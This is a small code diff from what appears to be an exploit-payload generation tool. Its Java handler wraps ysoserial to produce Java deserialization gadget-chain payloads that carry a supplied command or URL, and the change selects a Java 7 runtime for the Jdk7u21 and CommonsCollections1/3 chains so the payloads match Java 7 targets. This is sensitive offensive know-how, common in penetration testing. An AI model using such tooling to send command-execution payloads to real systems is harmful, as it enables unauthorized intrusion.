@@ -64,8 +64,13 @@ public class YsoserialHandler implements ChainHandler {
         String url = (String) params.getOrDefault("url", cmd);
         String arg = chain.equals("URLDNS") ? (url.isEmpty() ? cmd : url) : (cmd.isEmpty() ? url : cmd);
 
-        // jdk7u21 requires Java 7 JVM: AnnotationInvocationHandler serialVersionUID differs between Java 7 and 8+
-        String javaExe = chain.equals("Jdk7u21") ? resolveJava7Exe() : resolveJavaExe();
+        // jdk7u21 requires Java 7 JVM: AnnotationInvocationHandler serialVersionUID differs between Java 7 and 8+.
+        // CommonsCollections1 and CommonsCollections3 also use AnnotationInvocationHandler internally and
+        // must be generated with Java 7 when the target is a Java 7 JVM (sUID mismatch otherwise).
+        boolean needsJava7 = chain.equals("Jdk7u21")
+                          || chain.equals("CommonsCollections1")
+                          || chain.equals("CommonsCollections3");
+        String javaExe = needsJava7 ? resolveJava7Exe() : resolveJavaExe();
         byte[] bytes = invokeYsoserial(chain, arg, javaExe);
         if (bytes.length == 0) {
             return new PayloadResult("application/octet-stream", bytes,
